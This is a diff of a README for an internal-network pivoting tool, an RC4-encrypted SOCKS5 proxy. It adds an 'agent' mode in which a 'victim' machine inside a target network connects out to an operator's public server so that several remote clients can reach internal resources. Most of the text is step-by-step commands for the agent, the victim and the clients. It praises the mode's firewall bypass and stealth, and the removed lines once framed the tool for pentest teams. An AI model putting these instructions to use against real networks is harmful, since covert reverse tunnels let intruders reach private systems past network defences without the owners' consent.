@@ -1,14 +1,19 @@
 # Pivot Internal Tool
 
-A SOCKS5 proxy tool with RC4 encryption for internal network pivoting.
+A SOCKS5 proxy tool with RC4 encryption for internal network pivoting, now with **Agent Server** support for enhanced network traversal.
 
 ## Overview
 
-This tool consists of two components that support **multiple concurrent clients**:
-- **Server**: Runs on the target internal network, accepts encrypted connections from multiple clients simultaneously
-- **Client**: Runs on your machine(s), provides a local SOCKS5 proxy that encrypts traffic to the server
+This tool now supports three modes of operation:
+- **Server**: Runs on the target internal network (victim)
+- **Agent**: Acts as a relay server between victim and multiple clients
+- **Client**: Provides local SOCKS5 proxy that connects through the agent
 
-## Architecture
+## Architecture Options
+
+### Traditional Direct Architecture (Original)
+
+Direct connection between clients and server:
 
 ```
 Client Machine 1                Internal Network
@@ -26,9 +31,29 @@ Client Machine N    /                   |
 Multiple Clients              Single Server
 ```
 
+### New Agent Server Architecture (Supplement)
+
+The agent server enables a more flexible deployment where the victim server connects out to an external agent, which then serves multiple clients:
+
+```
+Internal Network    Agent Server         Client Machines
+[Victim Server] <--RC4--> [Agent] <--RC4--> [Client 1 SOCKS5]
+      |                    :1080             :1081
+      |                     |
+   [Internal]               |          <--RC4--> [Client 2 SOCKS5]
+   [Resources]              |                    :1082
+                           :8000
+                            |          <--RC4--> [Client N SOCKS5]
+                    [Victim Connection]          :108N
+```
+
 ## Usage
 
-### Server Mode
+### Traditional Mode (Direct Connection - Original)
+
+This is the original architecture where clients connect directly to the server.
+
+#### Server Mode
 Run this on the internal network machine:
 ```bash
 ./pivot-internal server -key secret -l :1080
@@ -38,8 +63,8 @@ Options:
 - `-key`: Encryption key (must match client)
 - `-l`: Listen address and port
 
-### Client Mode
-Run this on your local machine:
+#### Client Mode
+Run this on your local machine(s):
 ```bash
 ./pivot-internal client -key secret -r 10.10.10.10:1080 -l :1081
 ```
@@ -47,6 +72,68 @@ Run this on your local machine:
 Options:
 - `-key`: Encryption key (must match server)
 - `-r`: Remote server address
+- `-l`: Local SOCKS5 proxy listen address
+
+### Agent Mode (New - Reverse Connection Architecture)
+
+This new architecture allows the victim to connect out to an external agent, which is useful when the internal network has outbound connectivity but strict inbound filtering.
+
+**Key Features:**
+- **Victim makes outbound connection only** - No listening ports exposed on internal network
+- **Agent acts as relay** between victim and multiple clients
+- **Dual-port victim design**: Control connection (port 8000) + Local SOCKS5 server (port 9999, agent-only access)
+- **All traffic RC4 encrypted** throughout the entire chain
+
+**Network Flow:**
+```
+Client → Agent (:1080) → Victim Local SOCKS5 (:9999) → Internal Network
+         ↑ Control Conn ↑              ↑ RC4 Encrypted ↑
+         Victim (:8000)
+```
+
+#### 1. Agent Server (External/Public Server)
+Run this on a public server accessible by both victim and clients:
+```bash
+./pivot-internal agent -key troller123 -l :1080 -i :8000
+```
+
+Options:
+- `-key`: Encryption key (must match all components)
+- `-l`: Listen address for client connections
+- `-i`: Internal listen address for victim server connections
+
+#### 2. Victim Server (Internal Network)
+Run this on the internal network machine (connects to agent):
+```bash
+./pivot-internal server -key troller123 -c 103.12.0.1:8000
+```
+
+**Important:** The victim server will:
+- Connect to agent on port 8000 (control connection)
+- Start a local SOCKS5 server on port 9999 (only accessible by agent)
+- Handle SOCKS5 requests and access internal network resources
+- **No external ports are opened** - victim only makes outbound connections
+
+Options:
+- `-key`: Encryption key (must match agent)
+- `-c`: Agent server address to connect to
+
+#### 3. Client(s) (Your Local Machines)
+Run multiple clients connecting to the agent:
+
+Client 1:
+```bash
+./pivot-internal client -key troller123 -r 103.12.0.1:1080 -l :1081
+```
+
+Client 2:
+```bash
+./pivot-internal client -key troller123 -r 103.12.0.1:1080 -l :1082
+```
+
+Options:
+- `-key`: Encryption key (must match agent)
+- `-r`: Agent server address
 - `-l`: Local SOCKS5 proxy listen address
 
 ### Using the Proxy
@@ -147,12 +234,14 @@ This will automatically:
 
 ## Features
 
+- ✅ **Dual Architecture Support**: Traditional direct connection + New agent-based reverse connection
 - ✅ SOCKS5 proxy protocol support
 - ✅ RC4 encryption for traffic obfuscation
 - ✅ IPv4, IPv6, and domain name resolution
-- ✅ **Multiple concurrent clients** support
+- ✅ **Multiple concurrent clients** support (both architectures)
 - ✅ **Connection tracking and logging** with unique IDs
 - ✅ **Graceful shutdown** with signal handling (Ctrl+C)
+- ✅ **Reverse connection capability** for restrictive network environments
 - ✅ Cross-platform support (Windows, Linux, macOS)
 - ✅ **Concurrent connection handling** per client
 
@@ -164,53 +253,113 @@ This will automatically:
 
 ## Example Workflow
 
-### Single Server, Multiple Clients Setup
+### Example Workflow Comparison
 
-1. **Deploy server on internal network (10.10.10.10)**:
+#### Traditional Direct Connection Workflow
+
+1. **Deploy server on internal network (10.10.10.10)** - Server listens for incoming connections:
    ```bash
    ./pivot-internal server -key MySecretKey123 -l :1080
    ```
 
-2. **Start clients from different machines**:
-
-   **Machine A (192.168.1.100)**:
+2. **Connect clients from external machines**:
    ```bash
+   # Client 1
    ./pivot-internal client -key MySecretKey123 -r 10.10.10.10:1080 -l :1081
+   
+   # Client 2  
+   ./pivot-internal client -key MySecretKey123 -r 10.10.10.10:1080 -l :1082
    ```
 
-   **Machine B (192.168.1.101)**:
+#### Agent-Based Reverse Connection Workflow
+
+1. **Deploy agent server on public VPS (103.12.0.1)** - Agent waits for victim and clients:
    ```bash
-   ./pivot-internal client -key MySecretKey123 -r 10.10.10.10:1080 -l :1081
+   ./pivot-internal agent -key MySecretKey123 -l :1080 -i :8000
    ```
 
-   **Machine C (192.168.1.102)**:
+2. **Deploy victim server on internal network** - Victim connects out to agent:
    ```bash
-   ./pivot-internal client -key MySecretKey123 -r 10.10.10.10:1080 -l :1081
+   ./pivot-internal server -key MySecretKey123 -c 103.12.0.1:8000
    ```
 
-3. **Each machine can now use their local proxy**:
-
-   **From Machine A**:
+3. **Connect clients to agent from external machines**:
    ```bash
-   curl --socks5 192.168.1.100:1081 http://internal-server.local
+   # Client 1
+   ./pivot-internal client -key MySecretKey123 -r 103.12.0.1:1080 -l :1081
+   
+   # Client 2
+   ./pivot-internal client -key MySecretKey123 -r 103.12.0.1:1080 -l :1082
    ```
 
-   **From Machine B**:
-   ```bash
-   curl --socks5 192.168.1.101:1081 http://internal-server.local
-   ```
+### Testing the Setup
 
-   **From Machine C**:
-   ```bash
-   curl --socks5 192.168.1.102:1081 http://internal-server.local
-   ```
+#### Agent Mode Test Commands
+```bash
+# Test with curl through the proxy chain
+curl -x socks5h://127.0.0.1:1081 https://1.1.1.1/cdn-cgi/trace -v
 
-### Team Collaboration Scenario
+# Test internal network access (example)
+curl -x socks5h://127.0.0.1:1081 http://internal-server.local/
 
-This setup allows multiple team members to simultaneously access internal resources through a single pivot point:
+# Test with multiple clients simultaneously
+curl -x socks5h://127.0.0.1:1081 https://httpbin.org/ip &
+curl -x socks5h://127.0.0.1:1082 https://httpbin.org/ip &
+```
 
-- **Pentester 1** (192.168.1.100): Running vulnerability scans
-- **Pentester 2** (192.168.1.101): Manual web application testing  
-- **Pentester 3** (192.168.1.102): Network reconnaissance
+#### Traditional Mode Test Commands
+```bash
+# Test direct connection
+curl -x socks5h://127.0.0.1:1081 https://1.1.1.1/cdn-cgi/trace -v
+```
 
-All traffic is encrypted and routed through the same internal server, providing a coordinated attack surface while maintaining operational security.
+### Troubleshooting
+
+**Common Issues:**
+
+1. **"No victim server connected"** - Ensure victim server is running and connected to agent
+2. **"Connection refused"** - Check firewall settings and port availability
+3. **RC4 encryption errors** - Ensure all components use the same encryption key
+4. **SOCKS5 proxy errors** - Verify client application supports SOCKS5h (DNS resolution through proxy)
+
+**Log Analysis:**
+- Agent logs show client and victim connections
+- Victim logs show SOCKS5 request handling
+- Client logs show proxy server status
+
+### When to Use Each Architecture
+
+**Use Traditional Mode when:**
+- You have direct network access to the internal network
+- The internal network allows inbound connections
+- Simple setup with fewer components
+
+**Use Agent Mode when:**
+- The internal network has strict inbound filtering but allows outbound connections
+- You need a public staging point for multiple operators
+- The victim machine can initiate outbound connections to your controlled server
+- You want centralized logging and connection management
+
+## Architecture Comparison
+
+| Feature | Traditional Mode | Agent Mode |
+|---------|------------------|------------|
+| **Victim Network Requirements** | Must accept inbound connections | Only needs outbound connectivity |
+| **Firewall Bypass** | Limited | Excellent (outbound-only) |
+| **Setup Complexity** | Simple (2 components) | Moderate (3 components) |
+| **Scalability** | Good | Excellent |
+| **Centralized Management** | No | Yes (through agent) |
+| **Stealth** | Moderate | High (no listening ports on victim) |
+| **Single Point of Failure** | Victim server | Agent server |
+| **Use Case** | Direct access scenarios | Restrictive network environments |
+
+## Port Summary
+
+### Traditional Mode
+- **Server**: Listens on specified port (e.g., :1080)
+- **Client**: Connects to server, provides local SOCKS5
+
+### Agent Mode  
+- **Agent**: Listens on client port (:1080) and victim port (:8000)
+- **Victim**: Connects to agent (:8000), runs local SOCKS5 (:9999)
+- **Client**: Connects to agent (:1080), provides local SOCKS5
